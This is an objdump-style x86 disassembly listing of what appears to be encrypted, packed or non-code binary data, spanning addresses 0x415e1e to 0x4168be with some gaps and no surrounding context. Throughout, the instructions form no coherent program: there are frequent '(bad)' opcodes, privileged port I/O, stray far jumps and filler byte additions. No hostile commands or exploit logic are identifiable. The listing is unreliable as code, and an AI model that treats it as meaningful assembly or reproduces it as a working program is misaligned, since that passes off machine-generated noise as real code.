  415e1e:	lods   eax,DWORD PTR ds:[esi]
  415e1f:	adc    bl,BYTE PTR [eax-0x4cc0f955]
  415e25:	sbb    BYTE PTR [eax],dl
  415e27:	mov    esi,0xcd27f2e1
  415e2c:	lahf   
  415e2d:	adc    esi,DWORD PTR [ebx+0x33]
  415e30:	ret    
  415e31:	test   al,0xab
  415e33:	xchg   edx,eax
  415e34:	(bad)  
  415e35:	repz jmp 0x9d84:0x8340b1b2
  415e3d:	xchg   esi,eax
  415e3e:	mov    al,0xc1
  415e40:	xor    bh,BYTE PTR [ebp+0x185064a4]
  415e46:	pusha  
  415e47:	popa   
  415e48:	clc    
  415e49:	or     bl,cl
  415e4b:	ins    DWORD PTR es:[edi],dx
  415e4c:	in     eax,0xc8
  415e4e:	dec    ecx
  415e4f:	inc    edi
  415e50:	dec    ecx
  415e51:	pop    esp
  415e52:	lea    edx,[ebp-0x3e]
  415e55:	jmp    0x415e4d
  415e57:	jbe    0x415ebd
  415e59:	hlt    
  415e5a:	gs and al,0x28
  415e5d:	jge    0x415e67
  415e5f:	push   ebx
  415e60:	mov    al,0xeb
  415e62:	(bad)  
  415e63:	cmc    
  415e64:	ins    DWORD PTR es:[edi],dx
  415e65:	shl    DWORD PTR [ecx+0x66],cl
  415e68:	xor    al,0x60
  415e6a:	(bad)  
  415e6b:	adc    bh,BYTE PTR [ebp-0x74]
	...
  415ed6:	out    dx,al
  415ed7:	repnz cmc 
  415ed9:	add    edi,ebp
  415edb:	pop    es
  415edc:	(bad)  
  415edd:	call   FWORD PTR [ebp+0x1f]
  415ee0:	les    esi,FWORD PTR [eax+0x4c]
  415ee3:	push   ss
  415ee4:	xlat   BYTE PTR ds:[ebx]
  415ee5:	popf   
  415ee6:	addr16 in al,dx
  415ee8:	add    BYTE PTR [eax],al
  415eea:	add    BYTE PTR [ecx],al
  415eec:	add    BYTE PTR [eax],al
  415eee:	sahf   
  415eef:	leave  
  415ef0:	scas   al,BYTE PTR es:[edi]
  415ef1:	or     bh,bh
  415ef3:	push   ss
  415ef4:	inc    eax
  415ef5:	push   ds
  415ef6:	into   
  415ef7:	enter  0xa11b,0x3
  415efb:	cwde   
  415efc:	icebp  
  415efd:	sbb    al,0x4
  415eff:	loop   0x415ec1
  415f01:	push   edi
  415f02:	add    ebp,DWORD PTR [edx-0x26]
  415f05:	xchg   esp,eax
  415f06:	mov    ds:0x300ff83e,al
  415f0b:	stos   BYTE PTR es:[edi],al
  415f0c:	adc    edi,DWORD PTR [edi-0x45d3f0a9]
  415f12:	cmp    dh,al
  415f14:	add    ecx,DWORD PTR [eax-0x3f]
  415f17:	pushf  
  415f18:	rol    BYTE PTR [ecx+0x7c],0x51
  415f1c:	lods   eax,DWORD PTR ds:[esi]
  415f1d:	mov    ebp,0x2d6919d6
  415f22:	in     al,0xe1
  415f24:	dec    ebx
  415f25:	in     al,0x7
  415f27:	hlt    
  415f28:	mov    ebx,0x5d5a7167
  415f2d:	add    DWORD PTR ds:0xfa155cb0,ebp
  415f33:	xor    BYTE PTR [ecx+edx*4+0x1789e425],cl
  415f3a:	bound  edx,QWORD PTR [edi+esi*2]
  415f3d:	pop    ebp
  415f3e:	pushf  
  415f3f:	mov    ah,0x40
  415f41:	dec    edx
  415f42:	ror    DWORD PTR [eax],1
  415f44:	mov    al,ds:0xa2636936
  415f49:	mov    ds:0x422e0ca1,al
  415f4e:	loop   0x415fbd
  415f50:	fidiv  DWORD PTR [esi+0x9]
  415f53:	dec    ebp
  415f54:	push   cs
  415f55:	sbb    BYTE PTR [ecx],cl
  415f57:	ja     0x415f1f
  415f59:	jg     0x415f8b
  415f5b:	or     al,0xc3
  415f5d:	inc    edx
  415f5e:	jmp    0x415f39
  415f60:	mov    ds:0x983700b7,eax
  415f65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f66:	retf   0x78b8
  415f69:	push   DWORD PTR [esi]
  415f6b:	or     esp,ebx
  415f6d:	xor    BYTE PTR [esi+0x2525c2ee],bl
  415f73:	(bad)  [edi]
  415f75:	test   al,0xb
  415f77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f78:	(bad)  
  415f7a:	adc    BYTE PTR [ebx],al
  415f7c:	sub    BYTE PTR [ecx],dl
  415f7e:	inc    eax
  415f7f:	and    BYTE PTR ds:0x324f7fd5,dh
  415f85:	xor    dl,cl
  415f87:	add    al,0x88
  415f89:	jmp    0xfbaa:0x4537463f
  415f90:	sub    dh,bh
  415f92:	ss out dx,al
  415f94:	js     0xb6b593bc
  415f9a:	mov    ebp,0x1596b27
  415f9f:	add    BYTE PTR [ebx-0x10],bh
  415fa2:	mov    dl,0x15
  415fa4:	or     al,0xd
  415fa6:	out    0x30,al
  415fa8:	outs   dx,DWORD PTR ds:[esi]
  415fa9:	mov    cl,0x42
  415fab:	shl    dh,cl
  415fad:	jle    0x415fc0
  415faf:	add    ecx,DWORD PTR [ebx+0x62]
  415fb2:	pop    ds
  415fb3:	ins    BYTE PTR es:[edi],dx
  415fb4:	test   BYTE PTR [eax+0x6c],0x51
  415fb8:	xchg   ebx,eax
  415fb9:	popa   
  415fba:	pop    eax
  415fbb:	and    al,0x47
  415fbd:	or     esp,DWORD PTR [ebp+0x5d]
  415fc0:	pop    ebx
  415fc1:	xor    edi,DWORD PTR [edi+edx*1]
  415fc4:	mov    ch,0x71
  415fc6:	les    esp,FWORD PTR [ecx+eax*4+0x5e]
  415fca:	cwde   
  415fcb:	daa    
  415fcc:	pop    ebp
  415fcd:	shl    ah,0x49
  415fd0:	dec    ecx
  415fd1:	inc    ebx
  415fd2:	ss std 
  415fd4:	sahf   
  415fd5:	jnp    0x415fb4
  415fd7:	into   
  415fd8:	stc    
  415fd9:	cmp    eax,0x9e84f1e6
  415fde:	dec    edx
  415fdf:	and    edx,DWORD PTR [esi-0x450fac1e]
  415fe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fe6:	test   ebp,esp
  415fe8:	jp     0x41602a
  415fea:	mov    eax,0xd90bea
	...
  416053:	add    BYTE PTR [eax],al
  416055:	add    BYTE PTR [edi],dl
  416057:	mov    BYTE PTR [esi-0x6e],ch
  41605a:	push   esi
  41605c:	dec    DWORD PTR [ebp-0x37ca37e8]
  416062:	jecxz  0x41602f
  416064:	or     al,0xc6
  416066:	addr16 in eax,dx
  416068:	add    BYTE PTR [eax],al
  41606a:	add    BYTE PTR [ecx],al
  41606c:	add    BYTE PTR [eax],al
  41606e:	lahf   
  41606f:	sbb    al,0x70
  416071:	in     al,dx
  416072:	xchg   ebx,eax
  416073:	mov    dl,0x8c
  416075:	rcl    BYTE PTR [esi-0x6e519694],0xfd
  41607c:	popa   
  41607d:	pop    ebx
  41607e:	imul   ebp,DWORD PTR [ecx+0x76],0x139e7bd8
  416085:	sub    BYTE PTR [edx+ecx*4+0x4648b857],ah
  41608c:	mov    bl,0xa5
  41608e:	cmp    bl,ah
  416090:	inc    eax
  416091:	sbb    eax,0x1e2a0db5
  416096:	repnz or BYTE PTR [edx],dl
  416099:	and    eax,0xef36f4b5
  41609e:	adc    bh,BYTE PTR [ecx]
  4160a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160a1:	xchg   esp,eax
  4160a2:	loopne 0x416095
  4160a4:	clc    
  4160a5:	sub    dl,BYTE PTR [edx+0x1]
  4160a8:	test   al,0x52
  4160aa:	jae    0x41610d
  4160ac:	jmp    0x4160d2
  4160ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160b0:	push   ss
  4160b1:	mov    BYTE PTR [edx-0x64211894],bh
  4160b7:	cmp    bh,bl
  4160b9:	in     eax,dx
  4160ba:	xor    BYTE PTR [eax],al
  4160bc:	test   al,0x9f
  4160be:	jnp    0x41609d
  4160c0:	adc    esi,DWORD PTR [ecx-0x1b]
  4160c3:	call   DWORD PTR [edx-0x4304c135]
  4160c9:	pop    esp
  4160ca:	(bad)  
  4160cb:	mov    ah,0x58
  4160cd:	inc    edi
  4160ce:	test   al,0x9f
  4160d0:	fisttp WORD PTR [esi]
  4160d2:	adc    eax,0x6800016b
  4160d7:	adc    DWORD PTR [esp+edx*2-0x72],eax
  4160db:	fild   QWORD PTR [ecx+esi*1-0x44]
  4160df:	mov    eax,0x42a1a365
  4160e4:	jge    0x4160a6
  4160e6:	jb     0x4160b7
  4160e8:	or     al,0xe5
  4160ea:	pop    ss
  4160eb:	push   esp
  4160ec:	lock pop es
  4160ee:	adc    al,0x75
  4160f0:	and    DWORD PTR [edi+eax*2],ebx
  4160f3:	fnstsw WORD PTR [edi+0x6e]
  4160f6:	js     0x41612e
  4160f8:	(bad)
  4160fc:	cdq    
  4160fd:	jmp    0x41608a
  4160ff:	adc    DWORD PTR [eax-0xc90f260],ebp
  416105:	jno    0x416093
  416107:	out    dx,eax
  416108:	pop    ebp
  416109:	fcomp  DWORD PTR [ecx+ecx*1]
  41610c:	pop    esi
  41610d:	dec    edi
  41610e:	repz out 0xa2,al
  416111:	enter  0xde00,0x7d
  416115:	int    0xbe
  416117:	std    
  416118:	add    BYTE PTR [ecx+0x66ee4dc5],ch
  41611e:	pop    ecx
  41611f:	es ret 
  416121:	out    dx,eax
  416122:	mov    edx,0x311c46a5
  416127:	into   
  416128:	inc    edi
  416129:	add    al,0x47
  41612b:	or     eax,ecx
  41612d:	imul   eax,esp,0x27
  416130:	cli    
  416131:	repz mov dl,0x5c
  416134:	in     al,0x51
  416136:	cmc    
  416137:	pushf  
  416138:	ins    BYTE PTR es:[edi],dx
  416139:	cmp    BYTE PTR [edi-0xe],dh
  41613c:	push   0x59
  41613e:	pop    es
  41613f:	fucomp st(5)
  416141:	shl    DWORD PTR [ebx],cl
  416143:	leave  
  416144:	ror    DWORD PTR [edi],cl
  416146:	out    dx,ax
  416148:	or     bh,BYTE PTR [ecx+0x0]
  41614b:	outs   dx,BYTE PTR ds:[esi]
  41614c:	les    edx,FWORD PTR [eax-0x4e]
  41614f:	pusha  
  416150:	inc    ecx
  416151:	ins    BYTE PTR es:[edi],dx
  416152:	sbb    bl,cl
  416154:	call   0xb9796ca4
  416159:	sub    BYTE PTR [eax],bh
  41615b:	rcr    BYTE PTR ds:0xda7e5407,0x2f
  416162:	xchg   BYTE PTR [ebx],dl
  416164:	les    ebx,FWORD PTR [eax]
  416166:	add    al,0x2e
  416168:	in     eax,dx
  416169:	add    cl,0xa0
  41616c:	inc    edi
  41616d:	outs   dx,BYTE PTR ds:[esi]
	...
  4161d6:	and    cl,ch
  4161d8:	cmp    ebx,esi
  4161da:	sti    
  4161db:	fsubrp st(5),st
  4161dd:	inc    esi
  4161df:	push   edx
  4161e0:	sub    eax,0x91682ef3
  4161e5:	fsub   DWORD PTR [edi-0x12]
  4161e8:	add    BYTE PTR [eax],al
  4161ea:	add    BYTE PTR [ecx],al
  4161ec:	add    BYTE PTR [eax],al
  4161ee:	push   ebp
  4161ef:	and    eax,0xda8523e9
  4161f4:	xor    DWORD PTR [edi],eax
  4161f6:	xor    eax,0xa4fb846a
  4161fb:	aam    0x45
  4161fd:	fmul   DWORD PTR [esi+0x5]
  416200:	and    bh,dl
  416202:	data16 jo 0x416185
  416205:	xor    edx,DWORD PTR [esi+0xa465a]
  41620b:	stos   DWORD PTR es:[edi],eax
  41620c:	and    ch,BYTE PTR [ecx]
  41620e:	mov    BYTE PTR ds:0xa37a323e,ah
  416214:	add    BYTE PTR [ecx],al
  416216:	xor    esp,DWORD PTR [edi+0x3b8fc002]
  41621c:	jl     0x4161f6
  41621e:	inc    esi
  41621f:	inc    ecx
  416220:	ins    DWORD PTR es:[edi],dx
  416221:	xor    eax,0xf1c8c89
  416226:	jge    0x4161ca
  416228:	pop    edx
  416229:	push   ecx
  41622a:	fidivr WORD PTR [eax-0x54ff81d7]
  416230:	xchg   BYTE PTR ds:0xd02de9d,al
  416236:	je     0x41627d
  416238:	aam    0x60
  41623a:	xchg   BYTE PTR [edx+0x79cacf7f],dh
  416240:	loop   0x416238
  416242:	push   ebp
  416243:	sub    al,0x58
  416245:	inc    edx
  416246:	push   ebx
  416247:	mov    eax,0x8e2a66ce
  41624c:	jp     0x416253
  41624e:	pop    edi
  41624f:	stos   DWORD PTR es:[edi],eax
  416250:	(bad)  [eax+0x5f]
  416253:	sbb    al,0xe0
  416255:	push   ebp
  416256:	xor    DWORD PTR [eax-0x21],eax
  416259:	xcrypt-cfb (bad)
  41625a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41625b:	sub    ecx,DWORD PTR gs:[esp+ecx*2+0x49]
  416260:	jbe    0x41624b
  416262:	cmp    al,0x2f
  416264:	sbb    BYTE PTR [eax-0x19],ch
  416267:	cmp    BYTE PTR [esp+esi*2+0x55848ca0],cl
  41626e:	mov    cl,0x9c
  416270:	enter  0x7d6b,0x52
  416274:	mov    edx,0x98b1c7a8
  416279:	dec    edi
  41627a:	jge    0x4162f1
  41627c:	mov    eax,ds:0x9ad4350f
  416281:	vmulsd xmm7,xmm6,xmm0
  416285:	aam    0xe5
  416287:	inc    edx
  416288:	lock fst DWORD PTR [edi+eax*2+0x7b]
  41628d:	rcl    DWORD PTR [edx+0x2098cde6],1
  416293:	xchg   BYTE PTR [ecx],al
  416295:	dec    eax
  416296:	fnstenv [ebp+0xa]
  416299:	enter  0x6d5e,0x48
  41629d:	data16 xor dh,dl
  4162a0:	pop    ecx
  4162a1:	xchg   esp,eax
  4162a2:	clc    
  4162a3:	aad    0xb0
  4162a5:	fs es push ecx
  4162a8:	fcmovnb st,st(7)
  4162aa:	into   
  4162ab:	imul   edi,esi,0xffffffae
  4162ae:	push   edi
  4162af:	outs   dx,BYTE PTR ds:[esi]
  4162b0:	in     eax,dx
  4162b1:	jge    0x416288
  4162b3:	fisub  DWORD PTR [edi]
  4162b5:	out    dx,al
  4162b6:	mov    dh,BYTE PTR [edi]
  4162b8:	xor    al,0xd5
  4162ba:	xor    BYTE PTR [eax],0x45
  4162bd:	arpl   WORD PTR es:[ecx],bp
  4162c0:	sub    eax,0x4ef23323
  4162c5:	add    al,0x66
  4162c7:	fld    DWORD PTR [edi]
  4162c9:	out    dx,al
  4162ca:	push   ebp
  4162cb:	fnstcw WORD PTR [eax]
  4162cd:	into   
  4162ce:	neg    BYTE PTR [ebp-0x40]
  4162d1:	mov    dh,BYTE PTR [ebp-0x2d0e1c30]
  4162d7:	xor    bl,BYTE PTR [esi-0x40]
  4162da:	(bad)
  4162de:	push   es
  4162df:	paddq  mm5,QWORD PTR [ebx+0x4e082615]
  4162e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162e7:	fsubr  DWORD PTR [esi-0x6cf190d7]
  4162ed:	xchg   esi,eax
	...
  416356:	and    ebp,DWORD PTR [esi+0x32]
  416359:	and    eax,0x6e377d7f
  41635e:	mov    bl,0x5f
  416360:	call   0x6702:0x6b0b20ee
  416367:	out    dx,eax
  416368:	add    BYTE PTR [eax],al
  41636a:	add    BYTE PTR [ecx],al
  41636c:	add    BYTE PTR [eax],al
  41636e:	gs test edx,ebp
  416371:	pop    ebx
  416372:	int    0x3c
  416374:	test   DWORD PTR [esi+0x69ade136],ebx
  41637a:	sub    ebp,DWORD PTR [ebx-0x3a121ea7]
  416380:	xchg   ecx,eax
  416381:	test   edi,esp
  416383:	and    eax,0xd408065f
  416388:	aad    0x6
  41638a:	sub    al,BYTE PTR [ebp+0x72]
  41638d:	inc    edx
  41638e:	mov    edx,ecx
  416390:	push   ebx
  416391:	ficom  DWORD PTR [ecx+0x4bb6476]
  416397:	xchg   esi,eax
  416398:	adc    DWORD PTR [edi],ebp
  41639a:	inc    DWORD PTR [edx-0x5f0cedc5]
  4163a0:	push   edi
  4163a1:	sbb    al,0x30
  4163a3:	inc    ecx
  4163a4:	(bad)  
  4163a5:	mov    edx,0x118038ca
  4163aa:	mov    BYTE PTR [edi],dh
  4163ac:	mov    bh,0x8e
  4163ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163af:	outs   dx,BYTE PTR ds:[esi]
  4163b0:	or     DWORD PTR [bx-0x1d6b],ebp
  4163b5:	and    bh,BYTE PTR [ecx-0x485e1333]
  4163bb:	adc    BYTE PTR [ebp-0x4ad6ab6c],0x35
  4163c2:	sub    DWORD PTR [ebp+esi*8+0x5c],ecx
  4163c6:	mov    al,dh
  4163c8:	gs dec esp
  4163ca:	push   es
  4163cb:	ffree  st(0)
  4163cd:	mov    BYTE PTR [edi-0x743cd736],cl
  4163d3:	ja     0x41640d
  4163d5:	adc    bl,al
  4163d7:	push   0x5a7ff44
  4163dc:	cld    
  4163dd:	imul   edx,DWORD PTR [ecx-0x28455f7b],0xffffffa7
  4163e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163e5:	bound  eax,QWORD PTR [ebx]
  4163e7:	dec    edi
  4163e8:	pop    ebp
  4163e9:	lods   eax,DWORD PTR ds:[esi]
  4163ea:	jmp    0x140ef707
  4163ef:	pop    edi
  4163f0:	inc    eax
  4163f1:	or     dl,BYTE PTR [ecx]
  4163f3:	xchg   ebx,eax
  4163f4:	out    dx,eax
  4163f5:	bound  esi,QWORD PTR [esi-0x6f]
  4163f8:	fdiv   st,st(4)
  4163fa:	mov    edx,0x27da075f
  4163ff:	ja     0x4163a5
  416401:	and    eax,0xe40a0340
  416406:	test   BYTE PTR [edx+eiz*2+0x23],dh
  41640a:	mov    dh,0x22
  41640c:	sub    eax,0xa31d44e5
  416411:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416412:	add    eax,0x1a31143f
  416417:	sub    DWORD PTR [edx-0xe],esp
  41641a:	xchg   edi,eax
  41641b:	sbb    edi,DWORD PTR [edi]
  41641d:	dec    edi
  41641e:	sub    DWORD PTR [edi+0x7db6aaf1],edx
  416424:	add    eax,0x72054832
  416429:	rcl    BYTE PTR [ebp-0x6e],1
  41642c:	out    dx,al
  41642d:	mov    ch,0x91
  41642f:	cmp    eax,0x9900b7b8
  416434:	fidivr DWORD PTR [edx-0x2a15479]
  41643a:	pop    ss
  41643b:	leave  
  41643c:	pop    eax
  41643d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41643e:	bnd jp 0x4163d2
  416441:	repz scas al,BYTE PTR es:[edi]
  416443:	sub    al,0x6d
  416445:	jb     0x41640d
  416447:	stos   BYTE PTR es:[edi],al
  416448:	std    
  416449:	xchg   ecx,eax
  41644a:	leave  
  41644b:	push   ds
  41644c:	fstp   DWORD PTR [edi+0x76e8b941]
  416452:	sbb    BYTE PTR [ecx+0x3068c084],0xa6
  416459:	mov    eax,0xa9695aea
  41645e:	aad    0x14
  416460:	or     BYTE PTR [ecx+0x3831e862],al
  416466:	das    
  416467:	mov    ch,0x2d
  416469:	repz ja 0x41645f
  41646c:	cld    
  41646d:	mov    ecx,0x0
	...
  4164d6:	repz inc ebx
  4164d8:	ror    cl,1
  4164da:	lock (bad) 
  4164dd:	jnp    0x41646d
  4164df:	xor    al,0x5a
  4164e1:	xchg   esi,eax
  4164e2:	sub    eax,0x67ae4f92
  4164e7:	lock add BYTE PTR [eax],al
  4164ea:	add    BYTE PTR [ecx],al
  4164ec:	add    BYTE PTR [eax],al
  4164ee:	pop    esp
  4164ef:	inc    esi
  4164f0:	ror    BYTE PTR [esp+edi*2-0x429d90c],1
  4164f7:	cdq    
  4164f8:	out    dx,eax
  4164f9:	mov    ah,0x12
  4164fb:	pop    ebp
  4164fc:	aas    
  4164fd:	repnz push eax
  4164ff:	adc    bh,BYTE PTR [edi]
  416501:	xor    cl,dl
  416503:	out    dx,al
  416504:	aam    0x36
  416506:	add    al,0xd3
  416508:	add    DWORD PTR [ebx-0x44],edx
  41650b:	mov    ebx,0x77e05664
  416510:	xor    BYTE PTR [esp+ebp*4+0x55],dl
  416514:	push   esi
  416515:	adc    ebp,edx
  416517:	repnz jmp 0x74f:0xf7f1c953
  41651f:	mov    ebp,0xe74949f5
  416524:	inc    edx
  416525:	jg     0x41651d
  416527:	sub    al,0x9
  416529:	jnp    0x416510
  41652b:	xchg   ebp,eax
  41652c:	jp     0x4165a9
  41652e:	arpl   WORD PTR [esp+eiz*8],dx
  416531:	mov    ?,WORD PTR [ebx-0x57]
  416534:	sub    bl,BYTE PTR [ecx-0x109aa083]
  41653a:	daa    
  41653b:	cmp    esp,ebx
  41653d:	jae    0x4164fe
  41653f:	push   edi
  416540:	push   ss
  416541:	xchg   ebx,eax
  416542:	fs in  al,0x9f
  416545:	sahf   
  416546:	into   
  416547:	gs pop edi
  416549:	sub    eax,DWORD PTR [eax+0x3f]
  41654c:	jl     0x416526
  41654e:	sub    al,0xfb
  416550:	push   0x32
  416552:	mov    ah,0xc9
  416554:	xor    esp,DWORD PTR [ecx+ecx*8+0x4a]
  416558:	pusha  
  416559:	sbb    eax,0xb3ca7ee2
  41655e:	mov    dh,0x60
  416560:	in     eax,dx
  416561:	ror    ah,0x5f
  416564:	cmp    BYTE PTR [edi+ebp*8],cl
  416567:	fwait
  416568:	sbb    al,0xca
  41656a:	mov    dl,0xc9
  41656c:	call   0x8bc246f1
  416571:	adc    BYTE PTR [edx],dh
  416573:	push   0xfffffff1
  416575:	cld    
  416576:	or     BYTE PTR [ebp+0x72],ch
  416579:	jle    0x41650e
  41657b:	add    DWORD PTR [eax-0x7c189568],ecx
  416581:	(bad)
  416584:	cmc    
  416585:	mov    esi,0x22292f45
  41658a:	add    ebx,0x2324ef88
  416590:	bound  eax,QWORD PTR [eax]
  416592:	js     0x4165c6
  416594:	add    BYTE PTR ds:0xdd366f24,0xae
  41659b:	(bad)  {k7}{z}
  4165a0:	jle    0x4165fb
  4165a2:	jmp    0x9baf0881
  4165a7:	or     DWORD PTR [edi+0x1427491d],esp
  4165ad:	mov    ch,0x90
  4165af:	pop    DWORD PTR [eax-0x2c337eaf]
  4165b5:	aam    0x4
  4165b7:	cmp    DWORD PTR [ebx+esi*4],edx
  4165ba:	sbb    eax,0x3910b5c1
  4165bf:	nop
  4165c0:	jns    0x4165c3
  4165c2:	mov    edx,0xcbba3906
  4165c7:	addr16 dec ah
  4165ca:	jmp    0xa4e6:0x4edbebc2
  4165d1:	ror    BYTE PTR [ecx],cl
  4165d3:	loope  0x4165ba
  4165d5:	or     eax,DWORD PTR [edx+0x24]
  4165d8:	scas   eax,DWORD PTR es:[edi]
  4165d9:	mov    DWORD PTR ds:0x76a279c,eax
  4165df:	scas   eax,DWORD PTR es:[edi]
  4165e0:	sub    DWORD PTR [edx+0x1f],0xfffffff8
  4165e4:	mov    edx,0xfb3d4933
  4165e9:	add    esp,DWORD PTR [ebx+0xbca1d5]
	...
  416653:	add    BYTE PTR [eax],al
  416655:	add    BYTE PTR ds:0xfff32bd8,ah
  41665b:	repz std 
  41665d:	fisub  WORD PTR [esi+0x774fbcac]
  416663:	js     0x4166ab
  416665:	adc    esp,DWORD PTR [edi-0xf]
  416668:	add    BYTE PTR [eax],al
  41666a:	add    BYTE PTR [ecx],al
  41666c:	add    BYTE PTR [eax],al
  41666e:	xchg   edi,eax
  41666f:	adc    esi,DWORD PTR [ecx-0x2e9b6a92]
  416675:	mov    ds:0xd73c3b9,al
  41667a:	and    eax,0xe88ae64
  41667f:	fidivr WORD PTR [ebp+0x7981f295]
  416685:	ret    
  416686:	push   0xd757c821
  41668b:	iret   
  41668c:	xchg   ecx,eax
  41668d:	mov    WORD PTR ds:0xb8573ac5,?
  416693:	xchg   edx,eax
  416694:	repnz bound esp,QWORD PTR [edi+0x44]
  416698:	push   ebx
  416699:	out    dx,eax
  41669a:	sub    al,0x48
  41669c:	pop    edi
  41669d:	mov    ebx,0x8f8703bd
  4166a2:	repnz xchg edx,eax
  4166a4:	ss pop ebx
  4166a6:	(bad)  
  4166a7:	fiadd  WORD PTR [ebp-0x3f]
  4166aa:	xchg   ebx,eax
  4166ab:	retf   0x9b58
  4166ae:	lds    ebx,FWORD PTR [ebp+0x40]
  4166b1:	in     eax,dx
  4166b2:	popa   
  4166b3:	jbe    0x416657
  4166b5:	push   ebp
  4166b6:	push   ss
  4166b7:	es call 0x8c7c:0xf9923d23
  4166bf:	dec    ebx
  4166c0:	pop    ds
  4166c1:	mov    ebx,0x231768f7
  4166c6:	cli    
  4166c7:	mov    fs,ebx
  4166c9:	rcr    BYTE PTR [ecx-0x61],0xf9
  4166cd:	inc    esi
  4166ce:	cmp    BYTE PTR [ebp+0x7dc8fd3c],bl
  4166d4:	aas    
  4166d5:	mov    ebx,0xce723d9
  4166da:	pop    ebx
  4166db:	push   esi
  4166dc:	push   esp
  4166dd:	mov    ax,ds:0xdca31d07
  4166e3:	iret   
  4166e4:	xchg   ebp,eax
  4166e5:	or     esi,edi
  4166e7:	imul   esi,DWORD PTR [ebx-0x5462aa7d],0x2c
  4166ee:	mov    ebp,0x81fa611d
  4166f3:	aam    0xa1
  4166f5:	aam    0xdd
  4166f7:	mov    al,ds:0xe8cbf04d
  4166fc:	add    eax,0x2e5503a9
  416701:	sbb    DWORD PTR [eax+0x33],esi
  416704:	mov    BYTE PTR [edx+0x5edb6644],bl
  41670a:	retf   
  41670b:	repz sti 
  41670d:	pop    eax
  41670e:	add    al,0xf4
  416710:	jmp    0x416768
  416712:	(bad)  
  416713:	daa    
  416714:	jmp    0x2ca1:0x9f02082d
  41671b:	inc    edi
  41671c:	aad    0xb1
  41671e:	dec    ebx
  41671f:	mov    ecx,0xababa01b
  416724:	dec    ebp
  416725:	out    dx,eax
  416726:	test   DWORD PTR [ebx+0x9382928],ecx
  41672c:	(bad)  
  41672d:	ja     0x416731
  41672f:	add    cl,BYTE PTR [edx+ebx*8-0x4]
  416733:	or     BYTE PTR [ecx+0x3d],0x3a
  416737:	push   ecx
  416738:	sti    
  416739:	pop    ss
  41673a:	fistp  DWORD PTR [edi+0x57f25eda]
  416740:	repz xchg esp,eax
  416742:	and    BYTE PTR [edi-0xa12f53f],bh
  416748:	cwde   
  416749:	mov    ebx,0x1b57b379
  41674e:	in     eax,0xb4
  416750:	push   ds
  416751:	pusha  
  416752:	(bad)  
  416753:	aad    0x7
  416755:	pushf  
  416756:	pop    es
  416757:	cwde   
  416758:	ror    edi,0xe5
  41675b:	ficomp WORD PTR [ebp+0x43]
  41675e:	add    BYTE PTR [esp+ebp*1-0x6],dh
  416762:	cs jge 0x41678d
  416765:	mov    ds:0xebae3eda,eax
  41676a:	sbb    ebp,DWORD PTR [edi-0x75]
  41676d:	push   0x0
	...
  4167d3:	add    BYTE PTR [eax],al
  4167d5:	add    ah,al
  4167d7:	(bad)  
  4167d9:	(bad)  
  4167da:	(bad)  
  4167dc:	out    0xff,eax
  4167de:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  4167e2:	(bad)  
  4167e3:	push   esp
  4167e4:	jl     0x416837
  4167e6:	repnz add BYTE PTR [bx+si],al
  4167ea:	add    BYTE PTR [ecx],al
  4167ec:	add    BYTE PTR [eax],al
  4167ee:	sbb    eax,0xd5a80a24
  4167f3:	test   dh,0xa8
  4167f6:	mov    ds:0xd7dfbfac,al
  4167fb:	neg    BYTE PTR [ebx-0x4ed7203e]
  416801:	sbb    BYTE PTR [ebx+0x3dc3f377],cl
  416807:	out    dx,al
  416808:	in     al,dx
  416809:	in     eax,dx
  41680a:	lahf   
  41680b:	cmp    eax,0xfc023fa4
  416810:	test   BYTE PTR [eax-0x30b45042],0x67
  416817:	push   ebx
  416818:	in     al,0x7a
  41681a:	in     al,0xa
  41681c:	and    DWORD PTR [ebx+esi*1+0x58d1c3e2],eax
  416823:	jl     0x416815
  416825:	leave  
  416826:	or     BYTE PTR [ecx+0x448c3b68],dh
  41682c:	fisub  WORD PTR [eax-0x6d27e685]
  416832:	xchg   ebp,eax
  416833:	jmp    0x416895
  416835:	pop    es
  416836:	shl    dh,0xb8
  416839:	jb     0x4168b9
  41683b:	dec    edi
  41683c:	mov    ch,0xb6
  41683e:	mov    bh,0xc9
  416840:	jae    0x416816
  416842:	loop   0x416884
  416844:	mov    ecx,edx
  416846:	push   eax
  416847:	xchg   DWORD PTR [ebx-0x15],edi
  41684a:	nop
  41684b:	mov    edi,0xf37465d6
  416850:	mov    eax,ds:0x6b74b5f8
  416855:	mov    cl,0x60
  416857:	data16 fsubr st,st(3)
  41685a:	int    0x3a
  41685c:	pop    ds
  41685d:	push   esi
  41685e:	push   esi
  41685f:	push   esp
  416860:	sbb    edx,ecx
  416862:	test   BYTE PTR [ebx],ch
  416864:	test   DWORD PTR [ebx+0x64cc2f38],esp
  41686a:	or     cl,ch
  41686c:	push   esi
  41686d:	add    dl,dh
  41686f:	in     ax,0xef
  416872:	jb     0x416898
  416874:	fidivr DWORD PTR [esi-0x50]
  416877:	aam    0xa4
  416879:	push   0x7a0c2d27
  41687e:	adc    al,0x93
  416880:	xor    BYTE PTR [esi+0x74],ah
  416883:	mov    ah,0xa9
  416885:	out    0x94,al
  416887:	xor    esp,eax
  416889:	mov    edi,0x7007a1a6
  41688e:	mov    al,ds:0xeef8db2a
  416893:	into   
  416894:	mov    esi,0x83f1cad
  416899:	imul   ebp,DWORD PTR [esi],0x4279ab2a
  41689f:	adc    al,0x82
  4168a1:	xor    ecx,esi
  4168a3:	das    
  4168a4:	std    
  4168a5:	push   eax
  4168a6:	jb     0x4168e1
  4168a8:	adc    edx,0x4
  4168ab:	mov    bl,0x40
  4168ad:	and    esp,ebp
  4168af:	jnp    0x41688d
  4168b1:	and    ebp,esi
  4168b3:	imul   edx,DWORD PTR [ebx+0x4e],0x12
  4168b7:	mov    esp,0x899f65e0
  4168bc:	int    0xa3
  4168be:	fidiv  DWORD PTR [ebx-0x3175829c]
